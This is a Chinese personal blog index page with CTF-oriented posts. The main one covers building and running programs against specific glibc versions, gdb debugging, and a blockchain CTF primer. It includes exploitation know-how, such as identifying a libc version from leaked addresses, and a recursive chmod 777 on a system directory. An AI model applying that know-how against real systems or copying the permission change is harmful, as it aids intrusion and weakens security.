<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="wxk1997&#39;s blog">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="wxk1997&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="wxk1997">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>wxk1997's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">wxk1997's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">苦中作乐</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-commonweal">

    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/23/hello-world/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/23/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-23 14:06:35" itemprop="dateCreated datePublished" datetime="2020-11-23T14:06:35+08:00">2020-11-23</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-25 22:12:23" itemprop="dateModified" datetime="2020-11-25T22:12:23+08:00">2020-11-25</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          Here's something encrypted, password is required to continue reading.
          <!--noindex-->
            <div class="post-button">
              <a class="btn" href="/2020/11/23/hello-world/#more" rel="contents">
                阅读全文 &raquo;
              </a>
            </div>
          <!--/noindex-->
        
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/11/06/2020-11-06-11-glibc-basics/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/06/2020-11-06-11-glibc-basics/" class="post-title-link" itemprop="url">glibc相关操作记录</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-06 00:00:00" itemprop="dateCreated datePublished" datetime="2020-11-06T00:00:00+08:00">2020-11-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-07 13:35:01" itemprop="dateModified" datetime="2020-11-07T13:35:01+08:00">2020-11-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><table>
<thead>
<tr>
<th>更新时间</th>
<th>更新内容</th>
</tr>
</thead>
<tbody><tr>
<td>2020-11-06</td>
<td>初稿</td>
</tr>
<tr>
<td>2020-11-07</td>
<td>修复代码换行问题</td>
</tr>
</tbody></table>
<hr>
<h1 id="2-正文"><a href="#2-正文" class="headerlink" title="2. 正文"></a>2. 正文</h1><blockquote>
<p>Let’s play with glibc!</p>
</blockquote>
<h2 id="2-1-编译-glibc"><a href="#2-1-编译-glibc" class="headerlink" title="2.1. 编译 glibc"></a>2.1. 编译 glibc</h2><p>官网编译指南参考[4].</p>
<p>自己编译的话调试的时候可以看到glibc函数源码, 可以大大提升做题效率.</p>
<p>首先下载对应版本的glibc源码, 可以去官方镜像站下载[7]. (国内用户推荐去清华镜像站下载[3])</p>
<p>下载之后解压编译即可, 需要注意的是, 为了防止编译得到的libc和系统自带的libc发生冲突, 所以在编译的时候建议手动设置安装目录.</p>
<p>下面以在<code>ubuntu-18.04</code>上编译一个2.27版本的glibc为例.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/src/glibc</span><br><span class="line">$ wget https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/glibc-2.27.tar.xz <span class="comment">#下载glbic 源码压缩包</span></span><br><span class="line">$ tar xvf ./glibc-2.27.tar.xz <span class="comment"># 解压源码</span></span><br><span class="line">$ mkdir glibc-2.27_&#123;build,out&#125; <span class="comment"># 新建编译目录(glibc_2.27_build)和安装目录(glibc_2.27_out)</span></span><br><span class="line">$ <span class="built_in">cd</span> glibc-2.27_build</span><br><span class="line">$ ../glibc-2.27/configure <span class="string">&#x27;--prefix=/usr/src/glibc/glibc-2.27_out&#x27;</span> <span class="comment"># 配置安装目录</span></span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure>

<p>编译完成之后可以去安装目录的lib文件夹夹下找到编译得到的 <code>libc.so</code> 和 <code>ld.so</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/src/glibc/glibc-2.27_out</span><br><span class="line">$ ls -al ./lib/libc-2.27.so</span><br><span class="line">-rwxr-xr-x 1 wxk wxk 16778872 Nov  6 21:09 ./lib/libc-2.27.so</span><br><span class="line">$ ls -al ./lib/ld-2.27.so</span><br><span class="line">-rwxr-xr-x 1 wxk wxk 1398520 Nov  6 21:09 ./lib/ld-2.27.so</span><br></pre></td></tr></table></figure>

<h2 id="2-2-run-with-specific-glibc"><a href="#2-2-run-with-specific-glibc" class="headerlink" title="2.2. run with specific glibc"></a>2.2. run with specific glibc</h2><p>最简单的方法就是使用<code>LD_PRELOAD</code>环境变量声明想要使用的<code>libc.so</code>(目标libc). </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libc.so ./program</span><br></pre></td></tr></table></figure>

<p>但是这种方法不够稳定. 在加载目标libc的时候使用的还是系统自带的<code>ld.so</code>. libc和ld直接的ABI如果不一致的话就可能在加载libc或动态解析libc中函数地址时出错. 可能导致ABI版本不一样的原因有很多: libc和ld不是一个版本(不是同一个源码编译得到的); libc和ld编译时使用的编译器版本不一致或者编译时的编译参数不同. 严格来说, 只用同时编译得到的 ld 和 libc 的ABI版本才可以保证是完全一致的. </p>
<p>所以为了可以稳定地使用目标libc, 我们最好使用对应的ld来加载程序和libc</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=./libc.so ./ld.so ./program</span><br></pre></td></tr></table></figure>

<p>对应的pwntools代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./program&quot;</span>, env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so&quot;</span>&#125;)</span><br><span class="line">io = process([<span class="string">&quot;./ld.so&quot;</span>, <span class="string">&quot;./program&quot;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc.so&quot;</span>&#125;)</span><br></pre></td></tr></table></figure>

<p>做ctf题时, libc常有, 而ld不常有. 但是我们可以通过libc-database[2]找到libc对应的ld.</p>
<p>举个例子, 我们现在拿到一个 <code>libc.so</code>, 但是直接使用<code>LD_PRELOAD</code>会报错. 我们需要找到这个libc对应的ld.</p>
<p>首先使用<code>file</code>命令获取<code>BuildID</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file ./libc.so</span><br><span class="line">./libc.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c4fd86ec1eed57a09c79ce601f6c6e3796f574df, <span class="keyword">for</span> GNU/Linux 2.6.32, stripped</span><br></pre></td></tr></table></figure>

<p>用<code>BuildID</code>去libc-database的数据库里面搜索</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ libc-database git:(master) ./identify bid=c4fd86ec1eed57a09c79ce601f6c6e3796f574df</span><br><span class="line">libc6_2.23-0ubuntu11.2_amd64</span><br></pre></td></tr></table></figure>

<p>搜索命中, 接下来下载这个libc package, 就可以拿到ld了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./download libc6_2.23-0ubuntu11.2_amd64</span><br><span class="line"> -&gt; Downloading package</span><br><span class="line">  -&gt; Extracting package</span><br><span class="line">  -&gt; Package saved to libs/libc6_2.23-0ubuntu11.2_amd64</span><br><span class="line">$ ls  -al ./libs/libc6_2.23-0ubuntu11.2_amd64/ld-linux-x86-64.so.2</span><br><span class="line">-rwxr-xr-x 1 wxk wxk 162632 Nov  6 22:04 ./libs/libc6_2.23-0ubuntu11.2_amd64/ld-linux-x86-64.so.2</span><br></pre></td></tr></table></figure>

<h2 id="2-3-compile-with-specific-glibc"><a href="#2-3-compile-with-specific-glibc" class="headerlink" title="2.3. compile with specific glibc"></a>2.3. compile with specific glibc</h2><p>有时候出题时需要在编译时使用非系统自带的libc.主要就是用gcc编译时设置一些参数, 方法参考[8].</p>
<p>直接结合具体例子来讲. 以在<code>ubuntu-18.04</code>上编译一个使用<code>glibc 2.32</code>的程序为例.</p>
<p>首先需要有编译好的<code>glibc 2.32</code>. 这儿推荐使用docker-glibc-builder[1]. 方便快捷.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker run --rm --env STDOUT=1 sgerrand/glibc-builder 2.32 /usr/glibc-compat &gt; glibc-bin.tar.gz <span class="comment"># 编译得到 glibc package</span></span><br><span class="line">$ tar xvf ./glibc-bin.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> usr/glibc-compat</span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/home/wxk/hitctf-pwn/usr/glibc-compat</span><br><span class="line">$ <span class="built_in">export</span> glibc_install=`<span class="built_in">pwd</span>` <span class="comment"># glibc_install这个环境变量之后使用gcc的时候要用到</span></span><br><span class="line">$ sudo ln -s /home/wxk/hitctf-pwn/usr/glibc-compat /usr/glibc-compat <span class="comment"># ld.so 会去 /usr/glibc-compat 找数据, 所以需要建立一个符号链接</span></span><br></pre></td></tr></table></figure>

<p>test_glibc.c 内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gnu/libc-version.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;gnu_get_libc_version() = %s\n&quot;</span>, gnu_get_libc_version());</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello_world\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is wxk speaking\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用如下命令编译</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="variable">$glibc_install</span> <span class="comment"># 确保这个环境变量没问题</span></span><br><span class="line">$ gcc \</span><br><span class="line">  -L <span class="string">&quot;<span class="variable">$&#123;glibc_install&#125;</span>/lib&quot;</span> \</span><br><span class="line">  -I <span class="string">&quot;<span class="variable">$&#123;glibc_install&#125;</span>/include&quot;</span> \</span><br><span class="line">  -Wl,--rpath=<span class="string">&quot;<span class="variable">$&#123;glibc_install&#125;</span>/lib&quot;</span> \</span><br><span class="line">  -Wl,--dynamic-linker=<span class="string">&quot;<span class="variable">$&#123;glibc_install&#125;</span>/lib/ld-linux-x86-64.so.2&quot;</span> \</span><br><span class="line">  -std=c11 \</span><br><span class="line">  -v \</span><br><span class="line">  -o test_glibc.out \</span><br><span class="line">  ./test_glibc.c </span><br><span class="line">$ ./test_glibc.out</span><br><span class="line">gnu_get_libc_version() = 2.32</span><br><span class="line">hello world</span><br><span class="line">This is wxk speaking</span><br><span class="line">$ ldd ./test_glibc.out</span><br><span class="line">        linux-vdso.so.1 (0x00007fff333fd000)</span><br><span class="line">        libc.so.6 =&gt; /home/wxk/hitctf-pwn/usr/glibc-compat/lib/libc.so.6 (0x00007f27730ec000)</span><br><span class="line">        /home/wxk/hitctf-pwn/usr/glibc-compat/lib/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f2773090000)</span><br></pre></td></tr></table></figure>

<h2 id="2-4-Miscellaneous"><a href="#2-4-Miscellaneous" class="headerlink" title="2.4. Miscellaneous"></a>2.4. Miscellaneous</h2><p>介绍一些glibc相关的小技巧</p>
<h3 id="2-4-1-源码级调试glibc函数"><a href="#2-4-1-源码级调试glibc函数" class="headerlink" title="2.4.1. 源码级调试glibc函数"></a>2.4.1. 源码级调试glibc函数</h3><p>方法参考一个stackoverflow问题[5]. </p>
<p>首先使用的libc需要带有调试符号. 系统的自带的libc可以通过apt安装调试符号. 或者自己编译带符号的libc.</p>
<p>然后使用<code>dir</code>命令告诉<code>gdb</code>源码路径即可.</p>
<p>以调试<code>malloc</code>为例(使用系统自带libc).</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install libc6-dbg <span class="comment"># 安装调试符号</span></span><br><span class="line">$ sudo apt install glibc-source <span class="comment"># 安装(下载)源码</span></span><br><span class="line">$ <span class="built_in">cd</span> /usr/src/glibc <span class="comment"># 源码下载到这个文件夹下</span></span><br><span class="line">$ ls</span><br><span class="line">debian  glibc-2.27.tar.xz</span><br><span class="line">$ sudo chmod 777 -R . <span class="comment"># 当前目录默认不可写, 需要设置一下权限</span></span><br><span class="line">$ tar xvf ./glibc-2.27.tar.xz <span class="comment"># 解压源码</span></span><br><span class="line">$ <span class="built_in">cd</span> glibc-2.27/malloc <span class="comment"># 进入malloc源码目录</span></span><br><span class="line">$ <span class="built_in">pwd</span></span><br><span class="line">/usr/src/glibc/glibc-2.27/malloc</span><br><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;dir `pwd`&quot;</span> &gt;&gt; ~/.gdbinit <span class="comment"># 将dir命令写入 .gdbinit文件, gdb启动时会自动执行</span></span><br></pre></td></tr></table></figure>

<p>之后用gdb调试程序遇到malloc函数就可以看到源码了.</p>
<h3 id="2-4-2-通过函数地址得到-libc-版本"><a href="#2-4-2-通过函数地址得到-libc-版本" class="headerlink" title="2.4.2. 通过函数地址得到 libc 版本"></a>2.4.2. 通过函数地址得到 libc 版本</h3><p>有些题目比较狗, 明明利用过程中需要用到libc中的一些偏移, 但是题目不给libc. 这个时候如果我们可以leak libc中一些符号(通常是函数)的地址, 就可以使用工具拿到libc的版本.</p>
<p>原理很简单, 因为libc加载到内存中时是按页对齐的, 一页是4KB(12bit). 所以不管libc地址怎么随机化, 低12bit都是保持不变的. 但是同一个符号在不同版本的libc中低12bit通常是不一样的. 因此可以利用符号地址的低12bit来判断libc版本. 有时候仅仅通过一个符号可以找到多个候选libc, 可以通过多泄露几个符号地址缩小搜索范围.</p>
<p>推荐使用libc-database[2]. 具体使用方法参考官方文档即可.<br>如果比赛时可以联网的话(个人认为不能联网的比赛都是垃圾比赛), 可以使用在线版的libc-database: </p>
<p><a target="_blank" rel="noopener" href="https://libc.rip/">https://libc.rip</a></p>
<h1 id="3-结语"><a href="#3-结语" class="headerlink" title="3. 结语"></a>3. 结语</h1><p>这篇博客是基于之前在简书上的那一篇博客[9]的. 增加了一些新内容, 比如compile with specific libc, libc-database等. 也简化了一些使用方法. 整体结构脉络更加清晰了.</p>
<p>之后如果遇到glibc相关的知识, 本篇博客也会继续更新的. </p>
<p>如果有任何疑问或者观点, 欢迎在评论区讨论 :P .</p>
<h1 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://github.com/sgerrand/docker-glibc-builder">编译glibc的docker - github</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database - github</a></li>
<li><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/gnu/glibc/">清华tuna镜像站glibc文件夹</a></li>
<li><a target="_blank" rel="noopener" href="https://links.jianshu.com/go?to=https://gnu.org/software/libc/manual/html_mono/libc.html%23toc-Installing-the-GNU-C-Library">glibc官网编译指南</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/29955609/include-source-code-of-malloc-c-in-gdb">Include source code of malloc.c in gdb? - stackoverflow</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/NixOS/patchelf">patchelf - github</a></li>
<li><a target="_blank" rel="noopener" href="https://ftp.gnu.org/gnu/glibc/">glibc官方镜像站</a></li>
<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/2856438/how-can-i-link-to-a-specific-glibc-version">How can I link to a specific glibc version? - stackoverflow</a></li>
<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/ee1ad4044ef7">同时使用多种版本的libc &amp;&amp; 编译libc</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/09/2020-00-00-n-android-capture-traffic/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/09/2020-00-00-n-android-capture-traffic/" class="post-title-link" itemprop="url">安卓流量抓包指北</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-09 00:00:00" itemprop="dateCreated datePublished" datetime="2020-10-09T00:00:00+08:00">2020-10-09</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-06 20:16:46" itemprop="dateModified" datetime="2020-11-06T20:16:46+08:00">2020-11-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="更新历史"><a href="#更新历史" class="headerlink" title="更新历史"></a>更新历史</h2><table>
<thead>
<tr>
<th>更新时间</th>
<th>更新内容</th>
</tr>
</thead>
<tbody><tr>
<td>2020-10-09</td>
<td>初稿</td>
</tr>
</tbody></table>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2020/10/08/2020-00-00-n-blockchain_ctf_intro/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/20255635">
      <meta itemprop="name" content="wxk1997">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="wxk1997's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/10/08/2020-00-00-n-blockchain_ctf_intro/" class="post-title-link" itemprop="url">区块链ctf入门指北</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-10-08 00:00:00" itemprop="dateCreated datePublished" datetime="2020-10-08T00:00:00+08:00">2020-10-08</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2020-11-07 13:34:52" itemprop="dateModified" datetime="2020-11-07T13:34:52+08:00">2020-11-07</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>记录一下学习区块链ctf中的一些参考资料和心得.</p>
<h2 id="更新历史"><a href="#更新历史" class="headerlink" title="更新历史"></a>更新历史</h2><table>
<thead>
<tr>
<th>更新时间</th>
<th>更新内容</th>
</tr>
</thead>
<tbody><tr>
<td>2020-10-08</td>
<td>初稿</td>
</tr>
</tbody></table>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ol>
<li>memory</li>
<li>storage</li>
<li>stack</li>
<li>code</li>
<li>RETURNDATA</li>
<li>函数签名以及 keccak256算法</li>
</ol>
<h2 id="可能会用到的知识点"><a href="#可能会用到的知识点" class="headerlink" title="可能会用到的知识点"></a>可能会用到的知识点</h2><p>想做区块链(blockchain) ctf题当然需要先对区块链有一些了解, 如果时间够的话推荐过一遍肖臻老师的&lt;&lt;区块链技术与应用&gt;&gt;公开课[1]. </p>
<p>目前区块链中常见的习题形式都是基于Ethereum(以太坊)实现的一个有漏洞的智能合约. [2]中手把手教你如何从零搭建一个智能合约.</p>
<p>基于Ethereum开发智能合约使用的是Solidity语言, 网上各种教程很多, 不再赘述.</p>
<p>区块链ctf题中常见的漏洞类型有以下几种:</p>
<ol>
<li>整型溢出</li>
<li>重入攻击<ol>
<li><a target="_blank" rel="noopener" href="https://hitcxy.com/2020/easy-blockchains/">https://hitcxy.com/2020/easy-blockchains/</a></li>
</ol>
</li>
<li>变量覆盖<ol>
<li>rctf2020-roiscoin</li>
</ol>
</li>
<li>rop?</li>
</ol>
